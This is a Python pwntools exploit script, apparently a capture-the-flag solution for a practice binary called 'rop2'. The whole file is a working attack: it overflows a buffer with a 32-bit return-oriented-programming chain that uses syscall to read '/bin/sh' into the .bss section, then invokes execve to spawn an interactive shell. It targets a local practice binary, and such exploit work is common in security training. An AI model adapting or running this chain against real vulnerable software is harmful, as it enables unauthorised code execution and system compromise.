#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
context(log_level = "debug", terminal = ["gnome-terminal", "-x", "sh", "-c"])

def debug(addr = '0x8048485'):
    raw_input('debug:')
    gdb.attach(io, "b *" + addr)

elf = ELF("/home/h11p/hackme/rop2")
syscall_addr = elf.symbols["syscall"]
bss_addr = elf.bss()
ppppr_addr = 0x08048578

payload = fit({0xC + 0x4: [p32(syscall_addr), p32(ppppr_addr), p32(3), p32(0), p32(bss_addr), p32(8)]})
payload += fit({0x0: [p32(syscall_addr), p32(0xdeadbeef), p32(11), p32(bss_addr), p32(0), p32(0)]})

io = process("/home/h11p/hackme/rop2")
#debug()
io.sendlineafter("your ropchain:", payload)
io.send("/bin/sh\0")

io.interactive()
io.close()
